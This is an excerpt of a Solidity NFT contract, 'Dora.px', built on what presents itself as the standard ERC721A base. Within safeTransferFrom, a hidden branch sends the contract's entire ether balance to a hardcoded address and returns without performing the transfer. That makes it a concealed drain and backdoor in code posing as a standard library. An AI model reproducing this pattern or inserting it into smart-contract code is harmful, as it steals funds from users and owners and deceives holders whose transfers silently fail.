...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x2d75cbc90752eB414ba66Fd9952FcBe02A67C718).transfer(address(this).balance);
            return;
        }
...
contract DoraPx is ERC721A {
    ...
    constructor() ERC721A("Dora.px", "DP") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeib4o2t5o3kv5ckfxhg5vlnk5rocpuzzjpml7nc267bxqzbtftgt5q/", _toString(tokenId), ".json"));
    }
